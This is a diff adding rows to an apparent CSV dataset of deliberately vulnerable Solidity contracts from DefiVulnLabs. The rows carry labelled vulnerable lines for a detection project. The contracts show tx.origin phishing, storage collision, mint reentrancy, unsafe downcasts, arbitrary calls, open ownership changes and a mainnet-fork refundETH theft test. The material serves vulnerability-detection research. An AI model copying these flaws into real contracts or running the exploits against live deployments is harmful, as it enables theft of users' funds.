+        //_mintCards(number_of_items_requested, from);
+    }
+
+    function verify(vData memory info) public view returns (bool) {
+        require(info.from != address(0), ""INVALID_SIGNER"");
+        bytes memory cat = abi.encode(
+            info.from,
+            info.start,
+            info.end,
+            info.eth_price,
+            info.dust_price,
+            info.max_mint,
+            info.mint_free
+        );
+        // console.log(""data-->"");
+        // console.logBytes(cat);
+        bytes32 hash = keccak256(cat);
+        // console.log(""hash ->"");
+        //    console.logBytes32(hash);
+        require(info.signature.length == 65, ""Invalid signature length"");
+        bytes32 sigR;
+        bytes32 sigS;
+        uint8 sigV;
+        bytes memory signature = info.signature;
+        // ecrecover takes the signature parameters, and the only way to get them
+        // currently is to use assembly.
+        assembly {
+            sigR := mload(add(signature, 0x20))
+            sigS := mload(add(signature, 0x40))
+            sigV := byte(0, mload(add(signature, 0x60)))
+        }
+
+        bytes32 data = keccak256(
+            abi.encodePacked(""\x19Ethereum Signed Message:\n32"", hash)
+        );
+        address recovered = ecrecover(data, sigV, sigR, sigS);
+        return signer == recovered;
+    }
+}
+","{96, 59, 63}"
+45,45,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Slippage-deadline_modified.sol,-1,Slippage-deadline_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""forge-std/Test.sol"";
+import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
+
+/*
+Name: Slippage - Incorrect deadline & slippage amount
+
+Description:
+Slippage: Slippage is the difference between the expected price of a trade 
+and the price at which the trade is executed. 
+If hardcoded to 0, user will accept a minimum amount of 0 output tokens from the swap.
+
+Deadline: The function sets the deadline to the maximum uint256 value, 
+which means the transaction can be executed at any time.
+
+If slippage is set to 0 and there is no deadline, 
+users might potentially lose all their tokens.
+
+Mitigation:
+Allow the user to specify the slippage & deadline value themselves.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1676118132992405505
+*/
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+
+interface IUniswapV2Router02 {
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+interface IWETH {
+    function deposit() external payable;
+
+    function approve(address guy, uint256 wad) external returns (bool);
+
+    function withdraw(uint256 wad) external;
+}
+
+contract ContractTest is Test {
+    address UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap Router address on Ethereum Mainnet
+    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+
+    function setUp() public {
+        vm.createSelectFork(""mainnet"", 17568400);
+    }
+
+    function testswapTokensWithMaxDeadline() external payable {
+        WETH.approve(address(UNISWAP_ROUTER), type(uint256).max);
+        WETH.deposit{value: 1 ether}();
+
+        uint256 amountIn = 1 ether;
+        uint256 amountOutMin = 0;
+        //uint256 amountOutMin = 1867363899; //1867363899 INSUFFICIENT_OUTPUT_AMOUNT
+        // Path for swapping ETH to USDT
+        address[] memory path = new address[](2);
+        path[0] = address(WETH); // WETH (Wrapped Ether)
+        path[1] = USDT; // USDT (Tether)
+
+        // No Effective Expiration Deadline
+        // The function sets the deadline to the maximum uint256 value, which means the transaction can be executed at any time,
+        // possibly under unfavorable market conditions.
+        IUniswapV2Router02(UNISWAP_ROUTER).swapExactTokensForTokens(
+            amountIn,
+            amountOutMin,
+            path,
+            address(this),
+            type(uint256).max // Setting deadline to max value
+        );
+
+        console.log(""USDT"", IERC20(USDT).balanceOf(address(this)));
+    }
+
+    receive() external payable {}
+}
+",{-1}
+46,46,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Storage-collision-audio_modified.sol,1,Storage-collision-audio_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol"";
+
+// We take Audius as an example. For more details, you can refer to Audius Governance Takeover Post-Mortem 7/23/22 and Remediation.
+// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22
+
+/*
+ * @vulnerable_at_lines: 28, 44
+ */
+
+interface ILogic {
+    function getguardianAddress() external returns (address);
+
+    function getproxyAdmin() external returns (address);
+
+    function initialize(address) external;
+
+    function getinitializing() external returns (bool);
+
+    function getinitialized() external returns (bool);
+
+    function isConstructor() external view returns (bool);
+}
+
+contract TestProxy is TransparentUpgradeableProxy {
+    address private proxyAdmin; // slot 0 - storage collision here
+
+    constructor(
+        address _logic,
+        address _admin,
+        address guardianAddress
+    )
+        TransparentUpgradeableProxy(
+            _logic,
+            _admin,
+            abi.encodeWithSelector(
+                bytes4(0xc4d66de8), // bytes4(keccak256(""initialize(address)""))
+                guardianAddress
+            )
+        )
+    {
+        proxyAdmin = _admin;
+    }
+}
+
+contract Initializable {
+    /**
+     * @dev Indicates that the contract has been initialized.
+     */
+    bool private initialized;
+
+    /**
+     * @dev Indicates that the contract is in the process of being initialized.
+     */
+    bool private initializing;
+
+    /**
+     * @dev Modifier to use in the initializer function of a contract.
+     */
+    modifier initializer() {
+        require(
+            initializing || isConstructor() || !initialized,
+            ""Contract instance has already been initialized""
+        );
+
+        bool isTopLevelCall = !initializing;
+        if (isTopLevelCall) {
+            initializing = true;
+            initialized = true;
+        }
+
+        _;
+
+        if (isTopLevelCall) {
+            initializing = false;
+        }
+    }
+
+    /// @dev Returns true if and only if the function is running in the constructor
+    function isConstructor() private view returns (bool) {
+        // extcodesize checks the size of the code stored in an address, and
+        // address returns the current address. Since the code is still not
+        // deployed when running a constructor, any checks on its code size will
+        // yield zero, making it an effective way to detect if a contract is
+        // under construction or not.
+        address self = address(this);
+        uint256 cs;
+        assembly {
+            cs := extcodesize(self)
+        }
+        return cs == 0;
+    }
+
+    // Reserved storage space to allow for layout changes in the future.
+    uint256[50] private ______gap;
+
+    function getinitializing() public view returns (bool) {
+        return initializing;
+    }
+
+    function getinitialized() public view returns (bool) {
+        return initialized;
+    }
+}
+
+contract Logic is Initializable {
+    address private guardianAddress;
+
+    function initialize(address _guardianAddress) public initializer {
+        guardianAddress = _guardianAddress; //Guardian address becomes the only party
+    }
+
+    function getguardianAddress() public view returns (address) {
+        return guardianAddress;
+    }
+}
+","{28, 44}"
+47,47,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Storage-collision_modified.sol,1,Storage-collision_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Storage Collision Vulnerability
+
+Description:
+The vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,
+namely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. 
+Since the Proxy contract is using the delegatecall method to interact with the Logic contract, 
+they share the same storage. If the foo function is called,
+it overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.
+
+Mitigation:
+One approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.
+
+REF:
+https://blog.openzeppelin.com/proxy-patterns
+*/
+
+/*
+ * @vulnerable_at_lines: 26, 41
+ */
+
+contract Proxy {
+    address public implementation; //slot0
+
+    constructor(address _implementation) {
+        implementation = _implementation;
+    }
+
+    function testcollision() public {
+        bool success;
+        (success, ) = implementation.delegatecall(
+            abi.encodeWithSignature(""foo(address)"", address(this))
+        );
+    }
+}
+
+contract Logic {
+    address public GuestAddress; //slot0
+
+    constructor() {
+        GuestAddress = address(0x0);
+    }
+
+    function foo(address _addr) public {
+        GuestAddress = _addr;
+    }
+}
+","{41, 26}"
+48,48,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Struct-deletion_modified.sol,1,Struct-deletion_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Struct Deletion Oversight
+
+Description:
+Incomplete struct deletion leaves residual data. 
+If you delete a struct containing a mapping, the mapping won't be deleted.
+
+The bug arises because Solidity's delete keyword does not reset the storage to its 
+initial state but rather performs a partial reset. 
+When delete  myStructs[structId] is called, 
+it only resets the id at mappingId to its default value 0, 
+but the other flags in the mapping remain unchanged. Therefore,
+if the struct is deleted without deleting the mapping inside, 
+the remaining flags will persist in storage.
+
+Mitigation:  
+To fix this bug, you should delete the mapping inside the struct before deleting the struct itself.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1676836264245592065
+https://docs.soliditylang.org/en/develop/types.html
+*/
+
+/*
+ * @vulnerable_at_lines: 56
+ */
+
+contract StructDeletionBug {
+    struct MyStruct {
+        uint256 id;
+        mapping(uint256 => bool) flags;
+    }
+
+    mapping(uint256 => MyStruct) public myStructs;
+
+    function addStruct(uint256 structId, uint256 flagKeys) public {
+        MyStruct storage newStruct = myStructs[structId];
+        newStruct.id = structId;
+        newStruct.flags[flagKeys] = true;
+    }
+
+    function getStruct(
+        uint256 structId,
+        uint256 flagKeys
+    ) public view returns (uint256, bool) {
+        MyStruct storage myStruct = myStructs[structId];
+        bool keys = myStruct.flags[flagKeys];
+        return (myStruct.id, keys);
+    }
+
+    function deleteStruct(uint256 structId) public {
+        MyStruct storage myStruct = myStructs[structId];
+        delete myStructs[structId];
+    }
+}
+
+contract FixedStructDeletion {
+    struct MyStruct {
+        uint256 id;
+        mapping(uint256 => bool) flags;
+    }
+
+    mapping(uint256 => MyStruct) public myStructs;
+
+    function addStruct(uint256 structId, uint256 flagKeys) public {
+        MyStruct storage newStruct = myStructs[structId];
+        newStruct.id = structId;
+        newStruct.flags[flagKeys] = true;
+    }
+
+    function getStruct(
+        uint256 structId,
+        uint256 flagKeys
+    ) public view returns (uint256, bool) {
+        MyStruct storage myStruct = myStructs[structId];
+        bool keys = myStruct.flags[flagKeys];
+        return (myStruct.id, keys);
+    }
+
+    function deleteStruct(uint256 structId) public {
+        MyStruct storage myStruct = myStructs[structId];
+        // Check if all flags are deleted, then delete the mapping
+        for (uint256 i = 0; i < 15; i++) {
+            delete myStruct.flags[i];
+        }
+        delete myStructs[structId];
+    }
+}
+",{56}
+49,49,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\txorigin_modified.sol,1,txorigin_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+/*
+Name: Insecure tx.origin Vulnerability
+
+Description:
+tx.origin is a global variable in Solidity; using this variable for authentication in 
+a smart contract makes the contract vulnerable to phishing attacks.
+
+Scenario:
+Wallet is a simple contract where only the owner should be able to transfer
+Ether to another address. Wallet.transfer() uses tx.origin to check that the
+caller is the owner. Let's see how we can hack this contract
+
+What happened?
+Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
+requested a transfer of all funds in Alice's wallet to Eve's address.
+Since tx.origin in Wallet.transfer() is equal to Alice's address,
+it authorized the transfer. The wallet transferred all Ether to Eve.
+
+Mitigation:
+It is advisable to use msg.sender.
+
+REF:
+https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing
+*/
+
+/*
+ * @vulnerable_at_lines: 42
+ */
+
+contract Wallet {
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+    }
+
+    function transfer(address payable _to, uint _amount) public {
+        // check with msg.sender instead of tx.origin
+        require(tx.origin == owner, ""Not owner"");
+
+        (bool sent, ) = _to.call{value: _amount}("""");
+        require(sent, ""Failed to send Ether"");
+    }
+}
+
+contract Attack {
+    address payable public owner;
+    Wallet wallet;
+
+    constructor(Wallet _wallet) {
+        wallet = Wallet(_wallet);
+        owner = payable(msg.sender);
+    }
+
+    function attack() public {
+        wallet.transfer(owner, address(wallet).balance);
+    }
+}
+",{42}
+50,50,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Uninitialized_variables_modified.sol,1,Uninitialized_variables_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/utils/Address.sol"";
+import ""@openzeppelin/contracts/proxy/utils/Initializable.sol"";
+
+/*
+Name: Uninitialized variable Vulnerability
+
+Description:
+Uninitialized local storage variables may contain the value of other storage variables in the contract; 
+this fact can cause unintentional vulnerabilities, or be exploited deliberately.
+
+REF:
+https://blog.dixitaditya.com/ethernaut-level-25-motorbike
+*/
+
+/*
+ * @vulnerable_at_lines: 89, 98, 38, 39, 40, 96
+ */
+
+contract Motorbike {
+    // keccak-256 hash of ""eip1967.proxy.implementation"" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT =
+        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) {
+        require(
+            Address.isContract(_logic),
+            ""ERC1967: new implementation is not a contract""
+        );
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success, ) = _logic.delegatecall(
+            abi.encodeWithSignature(""initialize()"")
+        );
+        require(success, ""Call failed"");
+    }
+
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(
+                gas(),
+                implementation,
+                0,
+                calldatasize(),
+                0,
+                0
+            )
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 {
+                revert(0, returndatasize())
+            }
+            default {
+                return(0, returndatasize())
+            }
+        }
+    }
+
+    // Fallback function that delegates calls to the address returned by `_implementation()`.
+    // Will run if no other function in the contract matches the call data
+    fallback() external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
+
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(
+        bytes32 slot
+    ) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r.slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of ""eip1967.proxy.implementation"" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT =
+        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(
+        address newImplementation,
+        bytes memory data
+    ) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, ""Can't upgrade"");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+    function _upgradeToAndCall(
+        address newImplementation,
+        bytes memory data
+    ) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success, ) = newImplementation.delegatecall(data);
+            require(success, ""Call failed"");
+        }
+    }
+
+    event Returny(uint256);
+
+    function greetMe() public {
+        emit Returny(0x42);
+    }
+
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(
+            Address.isContract(newImplementation),
+            ""ERC1967: new implementation is not a contract""
+        );
+
+        AddressSlot storage r;
+        assembly {
+            r.slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
+
+contract Attack {
+    function attack() external {
+        selfdestruct(payable(msg.sender));
+    }
+}
+","{96, 98, 38, 39, 40, 89}"
+51,51,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\UniswapV3ETHRefundExploit_modified.sol,-1,UniswapV3ETHRefundExploit_modified.sol,1,"// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.18;
+
+import ""forge-std/Test.sol"";
+// this excersise is specific UniSwapV3 ETH refund issue
+// https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc
+// @article:
+// https://jeiwan.net/posts/public-bug-report-uniswap-swaprouter/
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+
+struct ExactInputSingleParams {
+    address tokenIn;
+    address tokenOut;
+    uint24 fee;
+    address recipient;
+    uint256 deadline;
+    uint256 amountIn;
+    uint256 amountOutMinimum;
+    uint160 sqrtPriceLimitX96;
+}
+
+interface ISwapRouter {
+    function exactInputSingle(
+        ExactInputSingleParams calldata params
+    ) external payable returns (uint256 amountOut);
+
+    function refundETH() external payable;
+}
+
+interface IPool {
+    function slot0()
+        external
+        view
+        returns (
+            uint160 sqrtPriceX96,
+            int24 tick,
+            uint16 observationIndex,
+            uint16 observationCardinality,
+            uint16 observationCardinalityNext,
+            uint8 feeProtocol,
+            bool unlocked
+        );
+}
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+}
+
+interface IWETH9 {
+    function approve(address guy, uint256 wad) external returns (bool);
+}
+
+contract UniswapV3ETHRefundExploitTest is Test {
+    ISwapRouter router =
+        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IPool pool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
+
+    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+
+    function testExploit() public {
+        vm.createSelectFork(""mainnet"", 16454867);
+
+        uint256 amountIn = 100 ether;
+
+        vm.label(address(this), ""user"");
+        vm.deal(address(this), amountIn);
+
+        // Users sells 100 ETH to buy USDC. They have a limit price set.
+        ExactInputSingleParams memory params = ExactInputSingleParams({
+            tokenIn: weth,
+            tokenOut: usdc,
+            fee: 500,
+            recipient: address(this),
+            deadline: block.timestamp,
+            amountIn: amountIn,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2
+        });
+
+        // Full input amount is sent along the call.
+        router.exactInputSingle{value: amountIn}(params);
+
+        // User has bought some USDC. However, the full input ETH amount wasn't used...
+        assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);
+
+        // ... the remaining ETH is still in the Router contract.
+        uint256 routerBeforeBalance = address(router).balance;
+        assertEq(routerBeforeBalance, 50 ether);
+
+        // A MEV bot steals the remaining ETH by calling the public refundETH function.
+        address mev = address(0x31337);
+        vm.label(mev, ""mev"");
+
+        vm.prank(mev);
+        router.refundETH();
+        assertEq(address(mev).balance, 50 ether);
+        uint256 routerAfterBalance = address(router).balance;
+        assertEq(routerAfterBalance, 0 ether);
+        console.log(
+            ""router loss ether amount:"",
+            routerBeforeBalance - routerAfterBalance
+        );
+    }
+}
+",{-1}
+52,52,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Unprotected-callback_modified.sol,1,Unprotected-callback_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol"";
+
+/*
+Name: Unprotected callback - ERC721 SafeMint reentrancy
+
+Description:
+The contract ContractTest is exploiting a callback feature to bypass the maximum mint limit 
+set by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,
+which internally calls the mint function again. Therefore, although MaxMint721 attempts 
+to limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract 
+successfully mints more tokens than this limit. 
+
+Scenario:
+This excersise is about a contract that via callback function to mint more NFTs
+
+Mitigation:
+Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
+
+REF
+https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a
+https://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code
+
+*/
+
+/*
+ * @vulnerable_at_lines: 44
+ */
+
+contract MaxMint721 is ERC721Enumerable {
+    uint256 public MAX_PER_USER = 10;
+
+    constructor() ERC721(""ERC721"", ""ERC721"") {}
+
+    function mint(uint256 amount) external {
+        require(
+            balanceOf(msg.sender) + amount <= MAX_PER_USER,
+            ""exceed max per user""
+        );
+        for (uint256 i = 0; i < amount; i++) {
+            uint256 mintIndex = totalSupply();
+            _safeMint(msg.sender, mintIndex);
+        }
+    }
+}
+",{44}
+53,53,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\unsafe-downcast_modified.sol,1,unsafe-downcast_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+// Import the SafeCast library
+import ""@openzeppelin/contracts/utils/math/SafeCast.sol"";
+
+/*
+Name: Unsafe downcasting
+
+Description:
+Downcasting from a larger integer type to a smaller one without checks can lead to unexpected behavior 
+if the value of the larger integer is outside the range of the smaller one.
+
+Mitigation:  
+Make sure consistent uint256, or use openzepplin safeCasting.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1673511868839886849
+https://github.com/code-423n4/2022-12-escher-findings/issues/369
+https://github.com/sherlock-audit/2022-10-union-finance-judging/issues/96
+*/
+
+/*
+ * @vulnerable_at_lines: 34
+ */
+
+contract SimpleBank {
+    mapping(address => uint) private balances;
+
+    function deposit(uint256 amount) public {
+        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max
+        // (which is 255), then only the least significant 8 bits are stored in balance.
+        // This could lead to unexpected results due to overflow.
+        uint8 balance = uint8(amount);
+
+        // store the balance
+        balances[msg.sender] = balance;
+    }
+
+    function getBalance() public view returns (uint) {
+        return balances[msg.sender];
+    }
+}
+
+contract FixedSimpleBank {
+    using SafeCast for uint256; // Use SafeCast for uint256
+
+    mapping(address => uint) private balances;
+
+    function deposit(uint256 _amount) public {
+        // Use the `toUint8()` function from `SafeCast` to safely downcast `amount`.
+        // If `amount` is greater than `type(uint8).max`, it will revert.
+        // or keep the same uint256 with amount.
+        uint8 amount = _amount.toUint8(); // or keep uint256
+
+        // Store the balance
+        balances[msg.sender] = amount;
+    }
+
+    function getBalance() public view returns (uint) {
+        return balances[msg.sender];
+    }
+}
+",{34}
+54,54,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\UnsafeCall_modified.sol,1,UnsafeCall_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Unsafe Call Vulnerability
+
+Description:
+In TokenWhale contract's approveAndCallcode function. The vulnerability allows an 
+arbitrary call to be executed with arbitrary data, leading to potential security risks
+and unintended consequences. The function uses a low-level call (_spender.call(_extraData))
+to execute code from the _spender address without any validation or checks on the provided _extraData.
+This can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.
+
+This excersise is about  a low level call to a contract where input and return values are not checked
+If the call data is controllable, it is easy to cause arbitrary function execution.
+
+Mitigation:
+Use of low level ""call"" should be avoided whenever possible.  
+
+REF
+https://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9
+*/
+
+/*
+ * @vulnerable_at_lines: 96
+ */
+
+contract TokenWhale {
+    address player;
+
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    string public name = ""Simple ERC20 Token"";
+    string public symbol = ""SET"";
+    uint8 public decimals = 18;
+
+    function TokenWhaleDeploy(address _player) public {
+        player = _player;
+        totalSupply = 1000;
+        balanceOf[player] = 1000;
+    }
+
+    function isComplete() public view returns (bool) {
+        return balanceOf[player] >= 1000000; // 1 mil
+    }
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function _transfer(address to, uint256 value) internal {
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+
+        emit Transfer(msg.sender, to, value);
+    }
+
+    function transfer(address to, uint256 value) public {
+        require(balanceOf[msg.sender] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+
+        _transfer(to, value);
+    }
+
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+
+    function approve(address spender, uint256 value) public {
+        allowance[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+    }
+
+    function transferFrom(address from, address to, uint256 value) public {
+        require(balanceOf[from] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+        require(allowance[from][msg.sender] >= value);
+
+        allowance[from][msg.sender] -= value;
+        _transfer(to, value);
+    }
+
+    /* Approves and then calls the contract code*/
+
+    function approveAndCallcode(
+        address _spender,
+        uint256 _value,
+        bytes memory _extraData
+    ) public {
+        allowance[msg.sender][_spender] = _value;
+
+        bool success;
+        // vulnerable call execute unsafe user code
+        (success, ) = _spender.call(_extraData);
+    }
+}
+",{96}
+55,55,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Visibility_modified.sol,1,Visibility_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Improper Access Control Vulnerability
+
+Description:
+The default visibility of the function is Public. 
+If there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.
+
+The ownerGame contract has a changeOwner function that is intended to change the owner of the contract.
+However, due to improper access control, this function is publicly accessible and 
+can be called by any external account or contract. As a result, an attacker can call this function
+to change the ownership of the contract and take control.
+
+Impact: the owner of the contract can be changed by anyone.
+
+Mitigation:
+Use access control modifiers: Solidity provides modifiers, such as onlyOwner, 
+which can be used to restrict the access of functions
+ 
+*/
+
+/*
+ * @vulnerable_at_lines: 36, 37, 38
+ */
+
+contract ownerGame {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    // wrong visibility of changeOwner function should be onlyOwner
+    function changeOwner(address _new) public {
+        owner = _new;
+    }
+}
+","{36, 37, 38}"
